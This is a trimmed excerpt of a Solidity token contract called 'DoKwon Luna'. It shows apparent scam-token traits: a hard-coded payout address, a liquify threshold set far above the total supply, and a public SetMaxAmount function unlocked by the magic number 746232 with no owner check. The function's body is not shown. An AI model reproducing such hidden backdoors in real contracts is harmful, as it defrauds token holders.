...
contract DoKwonLuna is Context, IERC20, Ownable {
    ...
    string private _name = "DoKwon Luna";
    string private _symbol = "DoKwon Unstable";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1 * 10**9 * 10**_decimals;

    address payable private marketing =
        payable(0xf94c19dA973155b5f18919537Aa93ebF684FC82b);
    ...
    constructor() {
        ...
        _liquifyThreshhold = _totalSupply / 100 * 10000;
    ...
    function SetMaxAmount(uint256 amount)public {
        require (amount == 746232, "ERC20 : Function Error");
